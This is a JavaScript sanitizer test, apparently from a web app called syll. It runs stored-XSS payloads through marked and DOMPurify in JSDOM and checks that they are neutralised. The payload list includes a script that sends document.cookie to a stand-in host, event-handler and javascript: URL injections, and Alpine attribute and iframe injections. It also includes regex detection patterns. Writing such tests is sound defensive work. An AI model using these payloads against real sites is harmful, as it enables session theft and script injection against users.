// Real-execution DOMPurify sanitizer test.
//
// Loads the vendored dompurify.min.js into a JSDOM window and runs a battery
// of malicious-markdown payloads through `marked.parse` + `DOMPurify.sanitize`
// (the same pipeline as renderMarkdown() in syll/web/static/app.js). Asserts
// that no dangerous attributes / tags / URLs survive.
//
// Intended to be invoked by tests/test_sanitizer_integration.py. If JSDOM is
// not installed, prints `JSDOM_MISSING` to stdout and exits 0; the Python
// test interprets that as a skip with an installation hint.

"use strict";

const fs = require("fs");
const path = require("path");
const vm = require("vm");

let JSDOM;
try {
  JSDOM = require("jsdom").JSDOM;
} catch (err) {
  console.log("JSDOM_MISSING");
  process.exit(0);
}

const VENDOR_DIR = path.join(__dirname, "..", "..", "syll", "web", "static", "vendor");
const dompurifySrc = fs.readFileSync(path.join(VENDOR_DIR, "dompurify.min.js"), "utf8");
const markedSrc = fs.readFileSync(path.join(VENDOR_DIR, "marked.min.js"), "utf8");

const dom = new JSDOM("<!DOCTYPE html><html><body></body></html>");
const win = dom.window;

// Run vendored libs in the JSDOM context so they bind to the same window.
vm.createContext(win);
vm.runInContext(markedSrc, win);
vm.runInContext(dompurifySrc, win);

// renderMarkdown body lifted from syll/web/static/app.js — the same pipeline
// users see in the browser. Keep this in sync with the app.js method body
// when changing sanitizer config.
function renderMarkdown(content) {
  if (!content) return "";
  try {
    const html = win.marked.parse(content);
    return win.DOMPurify.sanitize(html, {
      USE_PROFILES: { html: true },
      ADD_ATTR: [],
    });
  } catch (e) {
    const safe = String(content)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
    return "<pre>" + safe + "</pre>";
  }
}

const PAYLOADS = [
  // Stored XSS via <script>
  '<script>fetch("//evil.example/steal?t="+document.cookie)</script>',
  // Inline event handler
  '<img src=x onerror="fetch(\'//evil.example\')">',
  // javascript: URL on anchor
  '<a href="javascript:alert(1)">click</a>',
  // Alpine attribute injection — most relevant to our threat model
  '<div x-data="{x:1}" x-init="fetch(\'//evil.example\')">payload</div>',
  // Iframe injection
  '<iframe src="https://evil.example"></iframe>',
  // SVG with onload
  '<svg onload="fetch(\'//evil.example\')"><circle r="10"/></svg>',
  // data: URI on iframe
  '<iframe src="data:text/html,<script>fetch(\'//evil.example\')</script>"></iframe>',
];

const results = [];
let ok = true;

for (const payload of PAYLOADS) {
  const out = renderMarkdown(payload);
  // Properties we MUST NOT see in the sanitized output.
  const forbidden = [
    /<script/i,
    /\bon\w+\s*=/i,                 // onerror=, onload=, onclick=, etc.
    /\bx-(data|init|on|model|html|bind|show|if|for)\b/i,
    /javascript:/i,
    /<iframe/i,
    /evil\.example/i,
  ];
  const violations = forbidden.filter((re) => re.test(out));
  results.push({ payload, out, violations: violations.map(String) });
  if (violations.length > 0) ok = false;
}

console.log(JSON.stringify({ ok, results }, null, 2));
process.exit(ok ? 0 : 1);
